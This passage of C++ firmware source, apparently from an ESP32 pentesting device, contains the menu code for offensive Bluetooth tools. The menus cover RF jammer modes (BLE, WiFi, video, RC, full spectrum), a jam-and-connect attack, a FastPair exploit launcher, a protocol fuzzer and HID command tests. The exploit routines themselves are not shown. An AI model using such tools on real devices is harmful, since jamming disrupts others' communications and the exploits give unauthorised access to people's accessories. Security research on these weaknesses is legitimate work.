    options.push_back({"[Back]", []() {}});
    loopOptions(options, MENU_TYPE_SUBMENU, "AUDIO CONTROL TEST", 0, false);
}

void jamAndConnectMenu() {
    if(!isNRF24Available()) {
        tft.fillScreen(TFT_RED);
        drawMainBorderWithTitle("NRF24 JAMMER");
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.setCursor(20, 60);
        tft.print("NRF24L01+ Module");
        tft.setCursor(20, 90);
        tft.print("Status: NOT FOUND");
        tft.setCursor(20, 120);
        tft.print("Connect module and");
        tft.setCursor(20, 140);
        tft.print("restart device");
        tft.setCursor(20, 180);
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.print("Press any key to return");
        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return;
            }
            delay(50);
        }
    }
    std::vector<Option> jamOptions;
    jamOptions.push_back({"[Jam & Connect Attack]", [&]() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        int colonPos = targetInfo.lastIndexOf(':');
        String selectedMAC = targetInfo.substring(0, colonPos);
        uint8_t addrType = targetInfo.substring(colonPos + 1).toInt();
        NimBLEAddress target(selectedMAC.c_str(), addrType);
        if(requireSimpleConfirmation("Run jam & connect attack?")) {
            jamAndConnectEnhanced(target);
        }
    }});
    jamOptions.push_back({"[Set Jammer Mode]", [&]() {
        const char* jamModeNames[] = {
            "BLE Adv Only", "All BLE Channels", "BLE Adv Priority", 
            "Bluetooth All", "WiFi", "USB", "Video", "RC", "Full Spectrum"
        };
        const int visibleItems = 4;
        int selectedIdx = getCurrentJammerMode();
        int scrollOffset = 0;
        while(true) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SET JAMMER MODE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            int yPos = 60;
            for(int i = 0; i < visibleItems; i++) {
                int itemIdx = scrollOffset + i;
                if(itemIdx >= 9) break;
                if(itemIdx == selectedIdx) {
                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
                    tft.fillRect(20, yPos, tftWidth - 40, 25, TFT_WHITE);
                } else {
                    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                }
                tft.setCursor(25, yPos + 7);
                tft.print(jamModeNames[itemIdx]);
                yPos += 28;
            }
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            tft.setCursor(20, 200);
            tft.print("UP/DOWN: Scroll  SEL: Choose");
            tft.setCursor(20, 220);
            tft.print("ESC: Back");
            if(check(EscPress)) {
                delay(200);
                return;
            }
            if(check(PrevPress)) {
                if(selectedIdx > 0) {
                    selectedIdx--;
                    if(selectedIdx < scrollOffset) {
                        scrollOffset = selectedIdx;
                    }
                } else {
                    selectedIdx = 8;
                    scrollOffset = std::max(0, 8 - visibleItems + 1);
                }
                delay(200);
            }
            if(check(NextPress)) {
                if(selectedIdx < 8) {
                    selectedIdx++;
                    if(selectedIdx >= scrollOffset + visibleItems) {
                        scrollOffset = selectedIdx - visibleItems + 1;
                    }
                } else {
                    selectedIdx = 0;
                    scrollOffset = 0;
                }
                delay(200);
            }
            if(check(SelPress)) {
                setJammerMode(selectedIdx);
                std::vector<String> confirmLines;
                confirmLines.push_back("Jammer mode set to:");
                confirmLines.push_back(jamModeNames[selectedIdx]);
                showDeviceInfoScreen("MODE SET", confirmLines, TFT_GREEN, TFT_BLACK);
                delay(1000);
                return;
            }
            delay(50);
        }
    }});
    jamOptions.push_back({"[Back]", []() {}});
    loopOptions(jamOptions, MENU_TYPE_SUBMENU, "JAM & CONNECT", 0, false);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;
    
    initializeBLEOnce("Bruce-WP");
    
    options.push_back({"[FastPair Exploit]", []() {
        String targetInfo = selectTargetFromScan("EXPLOIT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Run FastPair exploit?")) {
            if(fastPairExploit(target)) {
                showSuccessMessage("EXPLOIT MAY HAVE WORKED!");
            } else {
                showErrorMessage("Exploit failed");
            }
        }
    }});
    
    options.push_back({"[Test Write Access]", []() {
        String targetInfo = selectTargetFromScan("TEST TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        NimBLEClient* pClient = nullptr;
        if(safeConnectWithRetry(target, 2, &pClient)) {
            bool foundWritable = false;
            std::vector<String> vulnerableServices;
            
            const std::vector<NimBLERemoteService*> services = pClient->getServices(true);
            
            for(auto pService : services) {
                const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
                
                for(auto pChar : chars) {
                    if(pChar->canWrite()) {
                        String uuid = pChar->getUUID().toString().c_str();
                        String svcUUID = pService->getUUID().toString().c_str();
                        vulnerableServices.push_back(svcUUID + " -> " + uuid);
                        foundWritable = true;
                        continue;
                    }
                }
            }
            
            if(pClient->isConnected()) {
                pClient->disconnect();
            }
            NimBLEDevice::deleteClient(pClient);
            
            if(foundWritable) {
                showDeviceInfoScreen("WRITABLE CHARACTERISTICS", vulnerableServices, TFT_GREEN, TFT_BLACK);
            } else {
                showErrorMessage("No writable characteristics");
            }
        } else {
            showErrorMessage("Connection failed");
        }
    }});
    
    options.push_back({"[Protocol Fuzzer]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Run protocol fuzzer?")) {
            runProtocolFuzzer(target);
        }
    }});
    
    options.push_back({"[Jam & Connect Attack]", []() {
        jamAndConnectMenu();
    }});
    
    options.push_back({"[Audio Control Test]", []() {
        audioControlTestMenu();
    }});
    
    options.push_back({"[Test HID Commands]", []() {
        String targetInfo = selectTargetFromScan("HID TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Test HID commands?")) {
            testHIDCommands(target);
        }
    }});
    
    options.push_back({"[Back]", []() { returnToMenu = true; }});
    
    loopOptions(options, MENU_TYPE_SUBMENU, "FASTPAIR RESEARCH", 0, false);
}